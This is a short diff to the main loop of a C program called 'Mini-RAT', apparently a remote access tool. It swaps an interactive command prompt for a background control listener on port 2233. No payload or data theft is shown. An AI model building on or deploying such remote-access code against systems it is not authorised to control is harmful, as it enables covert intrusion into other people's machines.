@@ -181,16 +181,15 @@ int main(int argc, char* argv[]) {
         pthread_create(&listen_thread, NULL, listener, (void*)&port);
         pthread_detach(listen_thread);
 
-        size_t line_sz = 1024;
-        char *line = malloc(line_sz);
-        while (running) {
-                printf("mini-rat> ");
-                getline(&line, &line_sz, stdin);
-                parse_cmd(line);
-        }
+        uint16_t cport = 2233;
+        pthread_t clisten_thread;
+        pthread_create(&clisten_thread, NULL, control_listener, (void*)&cport);
+        pthread_detach(clisten_thread);
+        
+        while (running);
 
-        free(line);
         log_msg(LOG_INFO, "Mini-RAT shutting down\n");
         pthread_cancel(listen_thread);
+        pthread_cancel(clisten_thread);
         return 0;
 }
